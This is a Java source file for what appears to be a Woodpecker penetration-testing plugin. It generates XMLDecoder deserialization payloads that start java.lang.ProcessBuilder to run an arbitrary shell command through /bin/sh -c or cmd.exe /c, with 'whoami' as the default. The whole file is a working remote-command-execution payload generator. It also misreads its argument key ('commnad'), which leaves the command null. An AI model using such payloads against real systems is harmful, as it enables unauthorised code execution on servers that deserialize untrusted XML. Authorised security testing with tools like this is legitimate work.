package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class ExecuteCommandPayloadGenerator implements IHelper {
    public String getHelperTabCaption() {
        return "execute command";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = XMLDecoderPlugin.pluginHelper.createArg();
        args1.setName("command");
        args1.setDefaultValue("whoami");
        args1.setDescription("命令");
        args1.setRequired(true);
        args.add(args1);

        IArg argOS = XMLDecoderPlugin.pluginHelper.createArg();
        argOS.setName("os_type");
        argOS.setDefaultValue("linux");
        argOS.setDescription("操作系统类型");
        argOS.setRequired(true);
        args.add(argOS);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String command = (String)customArgs.get("commnad");
        String os_type = (String)customArgs.get("os_type");
        String payload = null;
        if(os_type.equalsIgnoreCase("linux")){
            payload = String.format("<void class=\"java.lang.ProcessBuilder\">\n" +
                    "    <array class=\"java.lang.String\" length=\"3\">\n" +
                    "        <void index=\"0\">\n" +
                    "            <string>/bin/sh</string>\n" +
                    "        </void>\n" +
                    "        <void index=\"1\">\n" +
                    "            <string>-c</string>\n" +
                    "        </void>\n" +
                    "        <void index=\"2\">\n" +
                    "            <string>%s</string>\n" +
                    "        </void>\n" +
                    "    </array>\n" +
                    "    <void method=\"start\"/>\n" +
                    "</void>",command);
        }else if (os_type.equalsIgnoreCase("windows")){
            payload = String.format("<void class=\"java.lang.ProcessBuilder\">\n" +
                    "    <array class=\"java.lang.String\" length=\"3\">\n" +
                    "        <void index=\"0\">\n" +
                    "            <string>cmd.exe</string>\n" +
                    "        </void>\n" +
                    "        <void index=\"1\">\n" +
                    "            <string>/c</string>\n" +
                    "        </void>\n" +
                    "        <void index=\"2\">\n" +
                    "            <string>%s</string>\n" +
                    "        </void>\n" +
                    "    </array>\n" +
                    "    <void method=\"start\"/>\n" +
                    "</void>",command);
        }

        resultOutput.rawPrintln("/n" + payload + "/n");
    }
}
